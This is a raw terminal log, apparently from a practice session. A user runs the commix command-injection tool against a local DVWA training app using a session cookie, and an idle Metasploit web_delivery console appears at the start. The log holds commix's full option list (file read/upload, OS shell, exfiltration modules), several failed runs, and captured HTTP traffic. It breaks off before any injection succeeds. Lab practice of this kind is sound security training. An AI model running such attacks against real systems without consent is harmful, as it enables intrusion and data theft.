+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> sessions 
+[0m
+Active sessions
+===============
+
+No active sessions.
+
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[1]+  Stopped                 msfconsole -q
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ comm
+comm     command  commix   
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ commix -h
+
+[[1m[33m![0m] [1m[33mWarning: Python version 3.8.3 detected. You are advised to use Python version 2.7.x.[0m
+Usage: commix [option(s)]
+
+Options:
+  -h, --help            Show help and exit.
+
+  [1m[4mGeneral[0m:
+    These options relate to general matters.
+
+    -v VERBOSE          Verbosity level (0-4, Default: 0).
+    --version           Show version number and exit.
+    --output-dir=OUT..  Set custom output directory path.
+    -s SESSION_FILE     Load session from a stored (.sqlite) file.
+    --flush-session     Flush session files for current target.
+    --ignore-session    Ignore results stored in session file.
+    -t TRAFFIC_FILE     Log all HTTP traffic into a textual file.
+    --batch             Never ask for user input, use the default behaviour.
+    --encoding=ENCOD..  Force character encoding used for data retrieval (e.g.
+                        GBK).
+    --charset=CHARSET   Time-related injection charset (e.g.
+                        "0123456789abcdef")
+    --check-internet    Check internet connection before assessing the target.
+
+  [1m[4mTarget[0m:
+    This options has to be provided, to define the target URL.
+
+    -u URL, --url=URL   Target URL.
+    --url-reload        Reload target URL after command execution.
+    -l LOGFILE          Parse target from HTTP proxy log file.
+    -m BULKFILE         Scan multiple targets given in a textual file.
+    -r REQUESTFILE      Load HTTP request from a file.
+    --crawl=CRAWLDEPTH  Crawl the website starting from the target URL (1-2,
+                        Default: 0).
+    -x SITEMAP_URL      Parse target(s) from remote sitemap(.xml) file.
+
+  [1m[4mRequest[0m:
+    These options can be used to specify how to connect to the target URL.
+
+    -d DATA, --data=..  Data string to be sent through POST.
+    --host=HOST         HTTP Host header.
+    --referer=REFERER   HTTP Referer header.
+    --user-agent=AGENT  HTTP User-Agent header.
+    --random-agent      Use a randomly selected HTTP User-Agent header.
+    --param-del=PDEL    Set character for splitting parameter values.
+    --cookie=COOKIE     HTTP Cookie header.
+    --cookie-del=CDEL   Set character for splitting cookie values.
+    -H HEADER, --hea..  Extra header (e.g. 'X-Forwarded-For: 127.0.0.1').
+    --headers=HEADERS   Extra headers (e.g. 'Accept-Language: fr\nETag: 123').
+    --proxy=PROXY       Use a proxy to connect to the target URL.
+    --tor               Use the Tor network.
+    --tor-port=TOR_P..  Set Tor proxy port (Default: 8118).
+    --tor-check         Check to see if Tor is used properly.
+    --auth-url=AUTH_..  Login panel URL.
+    --auth-data=AUTH..  Login parameters and data.
+    --auth-type=AUTH..  HTTP authentication type (e.g. 'Basic' or 'Digest').
+    --auth-cred=AUTH..  HTTP authentication credentials (e.g. 'admin:admin').
+    --ignore-code=IG..  Ignore (problematic) HTTP error code (e.g. 401).
+    --force-ssl         Force usage of SSL/HTTPS.
+    --ignore-redirects  Ignore redirection attempts.
+    --retries=RETRIES   Retries when the connection timeouts (Default: 3).
+
+  [1m[4mEnumeration[0m:
+    These options can be used to enumerate the target host.
+
+    --all               Retrieve everything.
+    --current-user      Retrieve current user name.
+    --hostname          Retrieve current hostname.
+    --is-root           Check if the current user have root privileges.
+    --is-admin          Check if the current user have admin privileges.
+    --sys-info          Retrieve system information.
+    --users             Retrieve system users.
+    --passwords         Retrieve system users password hashes.
+    --privileges        Retrieve system users privileges.
+    --ps-version        Retrieve PowerShell's version number.
+
+  [1m[4mFile access[0m:
+    These options can be used to access files on the target host.
+
+    --file-read=FILE..  Read a file from the target host.
+    --file-write=FIL..  Write to a file on the target host.
+    --file-upload=FI..  Upload a file on the target host.
+    --file-dest=FILE..  Host's absolute filepath to write and/or upload to.
+
+  [1m[4mModules[0m:
+    These options can be used increase the detection and/or injection
+    capabilities.
+
+    --icmp-exfil=IP_..  The 'ICMP exfiltration' injection module.
+                        (e.g. 'ip_src=192.168.178.1,ip_dst=192.168.178.3').
+    --dns-server=DNS..  The 'DNS exfiltration' injection module.
+                        (Domain name used for DNS exfiltration attack).
+    --shellshock        The 'shellshock' injection module.
+
+  [1m[4mInjection[0m:
+    These options can be used to specify which parameters to inject and to
+    provide custom injection payloads.
+
+    -p TEST_PARAMETER   Testable parameter(s).
+    --skip=SKIP_PARA..  Skip testing for given parameter(s).
+    --suffix=SUFFIX     Injection payload suffix string.
+    --prefix=PREFIX     Injection payload prefix string.
+    --technique=TECH    Specify injection technique(s) to use.
+    --skip-technique..  Specify injection technique(s) to skip.
+    --maxlen=MAXLEN     Set the max length of output for time-related
+                        injection techniques (Default: 10000 chars).
+    --delay=DELAY       Seconds to delay between each HTTP request.
+    --time-sec=TIMESEC  Seconds to delay the OS response (Default 1).
+    --tmp-path=TMP_P..  Set the absolute path of web server's temp directory.
+    --web-root=WEB_R..  Set the web server document root directory (e.g.
+                        '/var/www').
+    --alter-shell=AL..  Use an alternative os-shell (e.g. 'Python').
+    --os-cmd=OS_CMD     Execute a single operating system command.
+    --os=OS             Force back-end operating system (e.g. 'Windows' or
+                        'Unix').
+    --tamper=TAMPER     Use given script(s) for tampering injection data.
+    --msf-path=MSF_P..  Set a local path where metasploit is installed.
+    --backticks         Use backticks instead of "$()", for commands
+                        substitution.
+
+  [1m[4mDetection[0m:
+    These options can be used to customize the detection phase.
+
+    --level=LEVEL       Level of tests to perform (1-3, Default: 1).
+    --skip-calc         Skip the mathematic calculation during the detection
+                        phase.
+    --skip-empty        Skip testing the parameter(s) with empty value(s).
+    --failed-tries=F..  Set a number of failed injection tries, in file-based
+                        technique.
+
+  [1m[4mMiscellaneous[0m:
+    --dependencies      Check for third-party (non-core) dependencies.
+    --list-tampers      Display list of available tamper scripts
+    --purge             Safely remove all content from commix data directory.
+    --skip-waf          Skip heuristic detection of WAF/IPS/IDS protection.
+    --mobile            Imitate smartphone through HTTP User-Agent header.
+    --offline           Work in offline mode.
+    --wizard            Simple wizard interface for beginner users.
+    --disable-coloring  Disable console output coloring.
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ commix -h[K[H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ commix -v -u https://dvwa.local/vulnerabilities/exec/#[K -d ""ip=10.10.10.3&Submit=Submit"[C  --cookie=""PHPSESSID=70pr2bemn4ueqd39fpg0ujtjuo; security=low"[C -p ""i"p"[C [K[K[1Pip[C[C --skip=Submit --level=1[H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ commix -v -u https://dvwa.local/vulnerabilities/exec/ -d "ip=10.10.10.3&Submit=Submit"  --cookie="PHPSESSID=70pr2bemn4ueqd39fpg0ujtjuo; security=low" -p ip --skip=Submit --level=1
+
+[[1m[33m![0m] [1m[33mWarning: Python version 3.8.3 detected. You are advised to use Python version 2.7.x.[0m
+Usage: commix [option(s)]
+
+commix.py: error: option -v: invalid integer value: '-u'
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ commix -v -u https://dvwa.local/vulnerabilities/exec/ -d "ip=10.10.10.3&Submit=Submit"  --cookie="PHPSESSID=70pr2bemn4ueqd39fpg0ujtjuo; security=low" -p ip --skip=Submit --level=1[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C"https://dvwa.local/vulnerabilities/exec/ -d "ip=10.10.10.3&Submit=Submit"  --cookie="PH[1@P[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C" -d "ip=10.10.10.3&Submit=Submit"  --cookie="P[1@H[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ commix -v -u "https://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="PHPSESSID=70pr2bemn4ueqd39fpg0ujtjuo; security=low" -p ip --skip=Submit --level=1[A[C[C[C[C[C[C[C[C[C
+
+
+[[1m[33m![0m] [1m[33mWarning: Python version 3.8.3 detected. You are advised to use Python version 2.7.x.[0m
+Usage: commix [option(s)]
+
+commix.py: error: option -v: invalid integer value: '-u'
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ commix -v -u "https://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="PHPSESSID=70pr2bemn4ueqd39fpg0ujtjuo; security=low" -p ip --skip=Submit --level=1[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C -u "https://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="[1@P[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [C[C[C[C[C[C[C[C[C[C1 -u "https://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie=[1@"[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [C[C[C[C[C[C[C[C[C[C[C[H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ commix -v 1 -u "https://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="PHPSESSID=70pr2bemn4ueqd39fpg0ujtjuo; security=low" -p ip --skip=Submit --level=1[A
+
+
+[[1m[33m![0m] [1m[33mWarning: Python version 3.8.3 detected. You are advised to use Python version 2.7.x.[0m
+                                      __           
+   ___   ___     ___ ___     ___ ___ /\_\   __  _   
+ /`___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\  [1m[4mv3.0-stable[0m
+/\ \__//\ \/\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </  
+\ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\ [90m[4mhttps://commixproject.com[0m
+ \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ ([91m@commixproject[0m)
+
++--
+[1mAutomated All-in-One OS Command Injection and Exploitation Tool[0m
+Copyright © 2014-2019 Anastasios Stasinopoulos[0m ([91m@ancst[0m)
++--
+
+([1m[31m![0m) Legal disclaimer: Usage of commix for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
+[0m
+[0m[[34m[1m*[0m] Resolving hostname 'dvwa.local'.[0m
+[0m[[34m[1m*[0m] Creating HTTP requests opener object.[0m
+[41m[x] Critical: The host seems to be down (Connection refused).[0m
+
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ commix -v 1 -u "https://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="PHPSESSID=70pr2bemn4ueqd39fpg0ujtjuo; security=low" -p ip --skip=Submit --level=1[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="[1P[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ commix -v 1 -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="PHPSESSID=70pr2bemn4ueqd39fpg0ujtjuo; security=low" -p ip --skip=Submit --level=1[A
+
+
+[[1m[33m![0m] [1m[33mWarning: Python version 3.8.3 detected. You are advised to use Python version 2.7.x.[0m
+                                      __           
+   ___   ___     ___ ___     ___ ___ /\_\   __  _   
+ /`___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\  [1m[4mv3.0-stable[0m
+/\ \__//\ \/\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </  
+\ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\ [90m[4mhttps://commixproject.com[0m
+ \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ ([91m@commixproject[0m)
+
++--
+[1mAutomated All-in-One OS Command Injection and Exploitation Tool[0m
+Copyright © 2014-2019 Anastasios Stasinopoulos[0m ([91m@ancst[0m)
++--
+
+([1m[31m![0m) Legal disclaimer: Usage of commix for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
+[0m
+[0m[[34m[1m*[0m] Resolving hostname 'dvwa.local'.[0m
+[0m[[34m[1m*[0m] Creating HTTP requests opener object.[0m
+[0m[[34m[1m*[0m] Checking connection to the target URL... [0m[ [32mSUCCEED[0m ]
+[41m[x] Critical: 13.[0m
+
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ commix -v 1 -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="PHPSESSID=70pr2bemn4ueqd39fpg0ujtjuo; security=low" -p ip --skip=Submit --level=1[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="P[1P[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [C[C[C[C[C[C[C[C[C[C4 -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="[1@P[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [C[C[C[C[C[C[C[C[C[C[C[H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ commix -v 4 -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="PHPSESSID=70pr2bemn4ueqd39fpg0ujtjuo; security=low" -p ip --skip=Submit --level=1[A
+
+
+[[1m[33m![0m] [1m[33mWarning: Python version 3.8.3 detected. You are advised to use Python version 2.7.x.[0m
+                                      __           
+   ___   ___     ___ ___     ___ ___ /\_\   __  _   
+ /`___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\  [1m[4mv3.0-stable[0m
+/\ \__//\ \/\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </  
+\ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\ [90m[4mhttps://commixproject.com[0m
+ \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ ([91m@commixproject[0m)
+
++--
+[1mAutomated All-in-One OS Command Injection and Exploitation Tool[0m
+Copyright © 2014-2019 Anastasios Stasinopoulos[0m ([91m@ancst[0m)
++--
+
+([1m[31m![0m) Legal disclaimer: Usage of commix for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
+[0m
+[0m[[34m[1m*[0m] Resolving hostname 'dvwa.local'.[0m
+[0m[[34m[1m*[0m] Creating HTTP requests opener object.[0m
+[0m[[34m[1m*[0m] Checking connection to the target URL... [0m
+[0m[[34m[1m*[0m] The target's request HTTP headers:[0m
+    |_ [45mPOST /vulnerabilities/exec/ HTTP/1.1[0m
+    |_ [45mAccept-Encoding: identity[0m
+    |_ [45mContent-Type: application/x-www-form-urlencoded[0m
+    |_ [45mContent-Length: 27[0m
+    |_ [45mHost: dvwa.local[0m
+    |_ [45mUser-Agent: commix/v3.0-stable (https://commixproject.com)[0m
+    |_ [45mCookie: PHPSESSID=70pr2bemn4ueqd39fpg0ujtjuo; security=low[0m
+    |_ [45mAccept: */*[0m
+    |_ [45mConnection: close[0m
+    |_ [45mip=10.10.10.3&Submit=Submit[0m
+[0m[[34m[1m*[0m] The target's response HTTP headers (200):[0m
+    |_ [45mDate: Thu, 27 Aug 2020 09:06:07 GMT[0m
+    |_ [45mServer: Apache/2.4.43 (Debian)[0m
+    |_ [45mExpires: Tue, 23 Jun 2009 12:00:00 GMT[0m
+    |_ [45mCache-Control: no-cache, must-revalidate[0m
+    |_ [45mPragma: no-cache[0m
+    |_ [45mVary: Accept-Encoding[0m
+    |_ [45mContent-Length: 4616[0m
+    |_ [45mConnection: close[0m
+    |_ [45mContent-Type: text/html;charset=utf-8[0m
+    |_ [45mURI: http://dvwa.local/vulnerabilities/exec/[0m
+[0m[[34m[1m*[0m] The target's HTTP response page content:[0m
+[35m
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: Command Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li class=""><a href="../../instructions.php">Instructions</a></li>
+<li class=""><a href="../../setup.php">Setup / Reset DB</a></li>
+</ul><ul class="menuBlocks"><li class=""><a href="../../vulnerabilities/brute/">Brute Force</a></li>
+<li class="selected"><a href="../../vulnerabilities/exec/">Command Injection</a></li>
+<li class=""><a href="../../vulnerabilities/csrf/">CSRF</a></li>
+<li class=""><a href="../../vulnerabilities/fi/.?page=include.php">File Inclusion</a></li>
+<li class=""><a href="../../vulnerabilities/upload/">File Upload</a></li>
+<li class=""><a href="../../vulnerabilities/captcha/">Insecure CAPTCHA</a></li>
+<li class=""><a href="../../vulnerabilities/sqli/">SQL Injection</a></li>
+<li class=""><a href="../../vulnerabilities/sqli_blind/">SQL Injection (Blind)</a></li>
+<li class=""><a href="../../vulnerabilities/weak_id/">Weak Session IDs</a></li>
+<li class=""><a href="../../vulnerabilities/xss_d/">XSS (DOM)</a></li>
+<li class=""><a href="../../vulnerabilities/xss_r/">XSS (Reflected)</a></li>
+<li class=""><a href="../../vulnerabilities/xss_s/">XSS (Stored)</a></li>
+<li class=""><a href="../../vulnerabilities/csp/">CSP Bypass</a></li>
+<li class=""><a href="../../vulnerabilities/javascript/">JavaScript</a></li>
+</ul><ul class="menuBlocks"><li class=""><a href="../../security.php">DVWA Security</a></li>
+<li class=""><a href="../../phpinfo.php">PHP Info</a></li>
+<li class=""><a href="../../about.php">About</a></li>
+</ul><ul class="menuBlocks"><li class=""><a href="../../logout.php">Logout</a></li>
+</ul>
+				</div>
+
+			</div>
+
+			<div id="main_body">
+
+				
+<div class="body_padded">
+	<h1>Vulnerability: Command Injection</h1>
+
+	<div class="vulnerable_code_area">
+		<h2>Ping a device</h2>
+
+		<form name="ping" action="#" method="post">
+			<p>
+				Enter an IP address:
+				<input type="text" name="ip" size="30">
+				<input type="submit" name="Submit" value="Submit">
+			</p>
+
+		</form>
+		<pre>PING 10.10.10.3 (10.10.10.3) 56(84) bytes of data.
+64 bytes from 10.10.10.3: icmp_seq=1 ttl=64 time=0.411 ms
+64 bytes from 10.10.10.3: icmp_seq=2 ttl=64 time=0.597 ms
+64 bytes from 10.10.10.3: icmp_seq=3 ttl=64 time=0.410 ms
+64 bytes from 10.10.10.3: icmp_seq=4 ttl=64 time=0.560 ms
+
+--- 10.10.10.3 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3058ms
+rtt min/avg/max/mdev = 0.410/0.494/0.597/0.085 ms
+</pre>
+	</div>
+
+	<h2>More Information</h2>
+	<ul>
+		<li><a href="http://www.scribd.com/doc/2530476/Php-Endangers-Remote-Code-Execution" target="_blank">http://www.scribd.com/doc/2530476/Php-Endangers-Remote-Code-Execution</a></li>
+		<li><a href="http://www.ss64.com/bash/" target="_blank">http://www.ss64.com/bash/</a></li>
+		<li><a href="http://www.ss64.com/nt/" target="_blank">http://www.ss64.com/nt/</a></li>
+		<li><a href="https://www.owasp.org/index.php/Command_Injection" target="_blank">https://www.owasp.org/index.php/Command_Injection</a></li>
+	</ul>
+</div>
+
+				<br /><br />
+				
+
+			</div>
+
+			<div class="clear">
+			</div>
+
+			<div id="system_info">
+				<input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=exec&security=low' )"> <input type="button" value="View Source" class="popup_button" id='source_button' data-source-url='../../vulnerabilities/view_source.php?id=exec&security=low' )"> <div align="left"><em>Username:</em> admin<br /><em>Security Level:</em> low<br /><em>PHPIDS:</em> disabled</div>
+			</div>
+
+			<div id="footer">
+
+				<p>Damn Vulnerable Web Application (DVWA) v1.10 *Development*</p>
+				<script src='../..//dvwa/js/add_event_listeners.js'></script>
+
+			</div>
+
+		</div>
+
+	</body>
+
+</html>[0m
+[41m[x] Critical: 13.[0m
+
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ commix -v 4 -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="PHPSESSID=70pr2bemn4ueqd39fpg0ujtjuo; security=low" -p ip --skip=Submit --level=1[1P --level=1[1P --level=1[1P --level=1[1P --level=1[1P --level=1[1P --level=1[1P --level=1[1P --level=1[1P --level=1[1P --level=1[1P --level=1[1P --level=1[1P --level=1[1P--level=1
+
+[[1m[33m![0m] [1m[33mWarning: Python version 3.8.3 detected. You are advised to use Python version 2.7.x.[0m
+                                      __           
+   ___   ___     ___ ___     ___ ___ /\_\   __  _   
+ /`___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\  [1m[4mv3.0-stable[0m
+/\ \__//\ \/\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </  
+\ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\ [90m[4mhttps://commixproject.com[0m
+ \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ ([91m@commixproject[0m)
+
++--
+[1mAutomated All-in-One OS Command Injection and Exploitation Tool[0m
+Copyright © 2014-2019 Anastasios Stasinopoulos[0m ([91m@ancst[0m)
++--
+
+([1m[31m![0m) Legal disclaimer: Usage of commix for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
+[0m
+[0m[[34m[1m*[0m] Resolving hostname 'dvwa.local'.[0m
+[0m[[34m[1m*[0m] Creating HTTP requests opener object.[0m
+[0m[[34m[1m*[0m] Checking connection to the target URL... [0m
+[0m[[34m[1m*[0m] The target's request HTTP headers:[0m
+    |_ [45mPOST /vulnerabilities/exec/ HTTP/1.1[0m
+    |_ [45mAccept-Encoding: identity[0m
+    |_ [45mContent-Type: application/x-www-form-urlencoded[0m
+    |_ [45mContent-Length: 27[0m
+    |_ [45mHost: dvwa.local[0m
+    |_ [45mUser-Agent: commix/v3.0-stable (https://commixproject.com)[0m
+    |_ [45mCookie: PHPSESSID=70pr2bemn4ueqd39fpg0ujtjuo; security=low[0m
+    |_ [45mAccept: */*[0m
+    |_ [45mConnection: close[0m
+    |_ [45mip=10.10.10.3&Submit=Submit[0m
+^X^C
+[[31m[1mx[0m] [31mError: User aborted procedure during the detection phase (Ctrl-C was pressed).[0m
+
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ commix -v 4 -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="PHPSESSID=70pr2bemn4ueqd39fpg0ujtjuo; security=low" -p ip --level=1[A[C[C[C[C[C[C[C[C[C4 -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="P[1P[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [C[C[C[C[C[C[C[C[C -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="PH[1P[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [C[C[C[C[C[C[C[C[C -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="PHP[1P[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [C[C[C[C[C[C[C[C -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="PHPS[1P[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [C[C[C[C[C[C[C-u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="PHPSE[1P[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [C[C[C[C[C[C[H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ commix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="PHPSESSID=70pr2bemn4ueqd39fpg0ujtjuo; security=low" -p ip --level=1[A
+[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K
+
+[[1m[33m![0m] [1m[33mWarning: Python version 3.8.3 detected. You are advised to use Python version 2.7.x.[0m
+                                      __           
+   ___   ___     ___ ___     ___ ___ /\_\   __  _   
+ /`___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\  [1m[4mv3.0-stable[0m
